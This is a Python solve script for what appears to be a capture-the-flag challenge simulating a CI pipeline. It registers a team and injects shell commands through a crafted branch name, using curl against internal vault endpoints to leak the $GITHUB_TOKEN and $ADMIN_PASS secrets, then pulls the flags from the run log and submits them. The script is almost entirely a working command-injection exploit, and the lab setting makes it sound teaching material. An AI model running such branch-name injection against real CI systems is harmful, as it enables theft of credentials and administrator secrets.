#!/usr/bin/env python3
import argparse
import random
import re
import string
import sys

import requests

FLAG_RE = re.compile(r"FLAG\{[A-Za-z0-9_]+\}")


def rands(n: int = 8) -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def extract_flags(text: str) -> list[str]:
    return FLAG_RE.findall(text or "")


def main():
    parser = argparse.ArgumentParser(description="Solve path A: direct internal-api chain")
    parser.add_argument("--base-url", required=True)
    args = parser.parse_args()
    base = args.base_url.rstrip("/")

    team_name = f"teamA_{rands()}"
    reg = requests.post(f"{base}/api/register", json={"team_name": team_name}, timeout=15)
    reg.raise_for_status()
    token = reg.json()["team"]["api_token"]

    # Single-shot chain through branch-name injection:
    # 1) read /internal/vault/user with GITHUB_TOKEN
    # 2) read /internal/vault/root with ADMIN_PASS
    branch_payload = (
        'release-2026"; '
        'curl -s "http://127.0.0.1:5000/internal/vault/user?token=$GITHUB_TOKEN"; '
        'curl -s "http://127.0.0.1:5000/internal/vault/root?password=$ADMIN_PASS"; '
        'echo "'
    )
    run = requests.post(
        f"{base}/api/run",
        headers={"X-Team-Token": token},
        json={
            "branch_name": branch_payload,
            "pr_title": "hotfix ci",
            "workflow_body": 'echo "[+] standard release checks"',
        },
        timeout=20,
    )
    run.raise_for_status()
    log = run.json()["run_log"]
    flags = extract_flags(log)
    if len(flags) < 2:
        print("[-] Could not extract both flags from run log")
        print(log)
        return 2
    user_flag, root_flag = flags[0], flags[1]

    submit = requests.post(
        f"{base}/api/submit",
        json={"token": token, "user_flag": user_flag, "root_flag": root_flag},
        timeout=15,
    )
    submit.raise_for_status()
    data = submit.json()
    if not data.get("solved"):
        print("[-] submit rejected:", data)
        return 3

    print(f"[+] TEAM={team_name}")
    print(f"[+] TOKEN={token}")
    print(f"[+] USER_FLAG={user_flag}")
    print(f"[+] ROOT_FLAG={root_flag}")
    print(f"[+] FINAL_FLAG={data['final_flag']}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
